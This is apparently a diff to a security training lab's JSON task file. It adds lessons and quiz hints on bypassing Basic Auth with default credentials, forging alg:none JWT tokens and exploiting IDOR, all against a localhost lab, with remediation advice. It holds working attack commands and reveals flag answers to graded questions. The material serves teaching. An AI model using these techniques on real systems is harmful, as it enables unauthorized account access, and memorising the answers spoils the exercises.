@@ -4,18 +4,48 @@
   "tasks": {
     "1": {
       "title": "Basic Auth and JWT: levels 1 and 2",
+      "body": "## Level 1: Basic Auth with a weak password\n\n```bash\n# The /level1 endpoint asks for Basic authentication:\ncurl http://127.0.0.1:18086/level1\n# → 401 Unauthorized\n\n# Try common credentials:\ncurl -u admin:admin123 http://127.0.0.1:18086/level1\n# → FLAG{basic_auth_weak_password}\n```\n\nBasic Auth sends `base64(admin:admin123)` in the `Authorization` header. It is not\nencryption: anyone who intercepts the traffic sees the credentials. And default\npasswords are in every brute-force list.\n\n## Level 2: JWT with algorithm none\n\nThe `/level2` endpoint uses JWT tokens:\n\n```bash\n# Request the page: it gives you a sample token\ncurl http://127.0.0.1:18086/level2\n# Token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.sig\n```\n\nA JWT has 3 parts: `header.payload.signature`. Decode the payload:\n\n```bash\necho 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9' | base64 -d\n# {\"user\":\"guest\",\"role\":\"user\"}\n```\n\nThe **alg:none** attack: change the header to say `alg:none` and the payload to\nsay `role:admin`. With no algorithm, there is no signature to verify:\n\n```bash\n# Header: {\"alg\":\"none\"} (no signature)\n# Payload: {\"user\":\"guest\",\"role\":\"admin\",\"exp\":9999999999}\n# Signature: (empty)\n\nHEADER=$(echo -n '{\"alg\":\"none\"}' | base64 | tr -d '=' | tr '/+' '_-')\nPAYLOAD=$(echo -n '{\"user\":\"guest\",\"role\":\"admin\",\"exp\":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')\nTOKEN=\"${HEADER}.${PAYLOAD}.\"\ncurl \"http://127.0.0.1:18086/level2?token=${TOKEN}\"\n```\n\nThe server accepts the token WITHOUT verifying the signature → you are admin.",
       "questions": {
-        "auth-bypass-t01-q01": { "prompt": "How are credentials encoded in HTTP Basic Auth?" },
-        "auth-bypass-t01-q02": { "prompt": "Submit the flag from level 1 (Basic Auth with weak credentials)." },
-        "auth-bypass-t01-q03": { "prompt": "What JWT header value disables signature verification?" }
+        "auth-bypass-t01-q01": {
+          "prompt": "How are credentials encoded in HTTP Basic Auth?",
+          "hint": "Base64 of username:password (it is NOT encryption!)."
+        },
+        "auth-bypass-t01-q02": {
+          "prompt": "Submit the flag from level 1 (Basic Auth with weak credentials).",
+          "hint": "curl -u admin:admin123 http://127.0.0.1:18086/level1"
+        },
+        "auth-bypass-t01-q03": {
+          "prompt": "What JWT header value disables signature verification?",
+          "hint": "alg: none — the 'no algorithm' algorithm."
+        },
+        "auth-bypass-t01-q04": {
+          "prompt": "Submit the lab level 2 flag: forge a JWT with alg:none and role:admin and pass it to /level2?token=X.",
+          "hint": "Header {\"alg\":\"none\"}, a payload with the admin role, both base64url-encoded, and an empty signature: the token ends with a dot."
+        }
       }
     },
     "2": {
       "title": "IDOR: when changing a number gives you access",
+      "body": "## Level 3: IDOR in the API\n\nThe lab exposes a REST API:\n\n```bash\n# List users (publicly available):\ncurl http://127.0.0.1:18086/api/users\n# {\"users\": [{\"id\": 1, \"name\": \"admin\"}, {\"id\": 2, \"name\": \"user\"}]}\n\n# Access a user's data:\ncurl http://127.0.0.1:18086/api/user/2\n# {\"id\": 2, \"name\": \"user\", \"role\": \"user\", \"secret\": \"normal\"}\n\n# Change the ID → the ADMIN's data:\ncurl http://127.0.0.1:18086/api/user/1\n# {\"id\": 1, \"name\": \"admin\", \"role\": \"admin\", \"secret\": \"FLAG{idor_admin_secret}\"}\n```\n\nThe API **does not verify** that the requester has permission to see that user.\nIt simply looks it up by ID and returns whatever it finds.\n\n## IDOR is the most common finding in web pentests\n\nAny endpoint that uses sequential IDs is a candidate:\n- `/api/orders/123` → change it to `/api/orders/124` (someone else's order)\n- `/api/invoices/2024-001` → another customer's invoice\n- `/api/messages/567` → another user's private message\n\n## Remediation\n\n```python\n# BAD (only identifies the object):\nuser = db.get_user(requested_id)\nreturn user\n\n# GOOD (verifies authorization):\nuser = db.get_user(requested_id)\nif user.id != current_user.id and current_user.role != 'admin':\n    return forbidden()\nreturn user\n```\n\n**Deny by default**: if you are not SURE the user has permission, deny.",
       "questions": {
-        "auth-bypass-t02-q01": { "prompt": "What acronym describes accessing other users' objects by manipulating identifiers?" },
-        "auth-bypass-t02-q02": { "prompt": "Submit the flag from the admin user's 'secret' field (endpoint /api/user/1)." },
-        "auth-bypass-t02-q03": { "prompt": "What is the root cause of IDOR?" }
+        "auth-bypass-t02-q01": {
+          "prompt": "What acronym describes accessing other users' objects by manipulating identifiers?",
+          "hint": "Insecure Direct Object Reference."
+        },
+        "auth-bypass-t02-q02": {
+          "prompt": "Submit the flag from the admin user's 'secret' field (endpoint /api/user/1).",
+          "hint": "curl http://127.0.0.1:18086/api/user/1"
+        },
+        "auth-bypass-t02-q03": {
+          "prompt": "What is the root cause of IDOR?",
+          "hint": "The server identifies the object but doesn't check who owns it.",
+          "options": {
+            "a": "The API is too fast",
+            "b": "Missing authorization check: the server returns the object without verifying that the requester owns it",
+            "c": "The ID is too short",
+            "d": "Missing HTTPS"
+          }
+        }
       }
     }
   }
